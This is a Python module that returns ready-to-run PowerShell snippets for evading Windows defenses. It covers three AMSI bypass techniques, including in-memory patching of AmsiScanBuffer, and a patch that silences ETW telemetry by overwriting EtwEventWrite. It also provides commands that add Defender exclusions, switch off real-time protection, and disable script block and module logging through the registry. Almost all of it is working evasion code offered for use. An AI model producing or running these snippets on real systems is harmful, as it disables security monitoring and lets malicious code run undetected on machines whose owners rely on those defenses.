"""AV/EDR bypass snippet generators: AMSI, ETW, Defender exclusions."""

from __future__ import annotations

__all__ = [
    "amsi_bypass",
    "etw_bypass",
    "defender_exclusion_command",
    "disable_defender_realtime",
    "scriptblock_logging_disable",
    "constrained_language_check",
]

_AMSI_PATCHES: dict[str, str] = {
    "reflection": (
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
        ".GetField('amsiInitFailed','NonPublic,Static')"
        ".SetValue($null,$true)"
    ),
    "patch_bytes": (
        "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
        "$b=$a.GetField('amsiSession','NonPublic,Static');"
        "$b.SetValue($null,$null);"
        "$c=$a.GetField('amsiContext','NonPublic,Static');"
        "$d=[System.Runtime.InteropServices.Marshal]::ReadInt64($c.GetValue($null));"
        "[System.Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($d+0xc),[Byte]0xb8);"
        "[System.Runtime.InteropServices.Marshal]::WriteInt32([IntPtr]($d+0xd),[Int32]0x80070057);"
        "[System.Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($d+0x11),[Byte]0xc3)"
    ),
    "com_bypass": (
        "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;"
        "public class Bypass{"
        '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);'
        '[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint op);'
        "}';"
        "$h=[System.Runtime.InteropServices.Marshal]::GetHINSTANCE([System.Reflection.Assembly]::Load('System.Management.Automation'));"
        "$addr=[Bypass]::GetProcAddress($h,'AmsiScanBuffer');"
        "[uint]$old=0;"
        "[Bypass]::VirtualProtect($addr,[UIntPtr]::new(8),0x40,[ref]$old)|Out-Null;"
        "[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xb8,0x57,0x00,0x07,0x80,0xc3),0,$addr,6)"
    ),
}

def amsi_bypass(technique: str = "reflection") -> str:
    """Return a PowerShell AMSI bypass snippet.

    Args:
        technique: ``reflection`` | ``patch_bytes`` | ``com_bypass``.
    """
    return _AMSI_PATCHES.get(technique, _AMSI_PATCHES["reflection"])

def etw_bypass() -> str:
    """Return a PowerShell snippet that patches EtwEventWrite to suppress ETW telemetry."""
    return (
        "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;"
        "public class ETW{"
        '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);'
        '[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);'
        '[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint op);'
        "}';"
        "$lib=[ETW]::LoadLibrary('ntdll.dll');"
        "$addr=[ETW]::GetProcAddress($lib,'EtwEventWrite');"
        "[uint]$old=0;"
        "[ETW]::VirtualProtect($addr,[UIntPtr]::new(1),0x40,[ref]$old)|Out-Null;"
        "[System.Runtime.InteropServices.Marshal]::WriteByte($addr,0xc3)"
    )

def defender_exclusion_command(path: str) -> str:
    """Return a PowerShell command to add a Defender path exclusion (requires admin)."""
    return f"Add-MpPreference -ExclusionPath '{path}'"

def disable_defender_realtime() -> str:
    """Return a PowerShell command to disable Defender real-time protection (requires admin)."""
    return "Set-MpPreference -DisableRealtimeMonitoring $true"

def scriptblock_logging_disable() -> list[str]:
    """Return registry commands to disable PowerShell Script Block Logging."""
    return [
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 0 /f',
    ]

def constrained_language_check() -> str:
    """Return a PowerShell command to check if Constrained Language Mode is active."""
    return "$ExecutionContext.SessionState.LanguageMode"
